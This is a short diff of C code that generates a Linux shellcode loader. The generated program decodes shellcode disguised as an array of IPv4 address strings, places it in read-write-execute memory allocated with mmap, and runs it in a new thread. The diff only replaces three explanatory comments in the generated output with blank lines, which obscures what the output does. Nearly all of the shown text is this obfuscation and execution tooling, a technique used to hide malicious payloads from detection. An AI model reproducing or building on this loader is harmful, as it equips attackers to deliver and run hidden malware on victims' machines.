@@ -30,7 +30,7 @@ bool generate_ipv4_output(const char* output_file) {
     fprintf(f, "#include <arpa/inet.h>\n");
     fprintf(f, "#include <pthread.h>\n\n");
     
-    fprintf(f, "// IPv4 to binary decoder for Linux\n");
+    fprintf(f, "\n");
     fprintf(f, "int decode_ipv4_fuscation(const char* ipv4[], unsigned char* output, int count) {\n");
     fprintf(f, "    struct in_addr addr;\n");
     fprintf(f, "    int offset = 0;\n\n");
@@ -87,7 +87,7 @@ bool generate_ipv4_output(const char* output_file) {
     fprintf(f, "    if (decode_ipv4_fuscation(IPv4Shell, shellcode, ELEMENTS_COUNT) != 0) {\n");
     fprintf(f, "        return -1;\n");
     fprintf(f, "    }\n\n");
-    fprintf(f, "    // Allocate executable memory\n");
+    fprintf(f, "    \n");
     fprintf(f, "    exec_mem = mmap(NULL, SHELLCODE_SIZE,\n");
     fprintf(f, "                    PROT_READ | PROT_WRITE | PROT_EXEC,\n");
     fprintf(f, "                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n");
@@ -97,7 +97,7 @@ bool generate_ipv4_output(const char* output_file) {
     fprintf(f, "    }\n\n");
     fprintf(f, "    memcpy(exec_mem, shellcode, SHELLCODE_SIZE);\n");
     fprintf(f, "    printf(\"[+] Shellcode at: %%p\\n\", exec_mem);\n\n");
-    fprintf(f, "    // Execute in thread\n");
+    fprintf(f, "    \n");
     fprintf(f, "    pthread_create(&thread, NULL, (void*(*)(void*))exec_mem, NULL);\n");
     fprintf(f, "    printf(\"[+] Press Enter to exit...\\n\");\n");
     fprintf(f, "    getchar();\n\n");
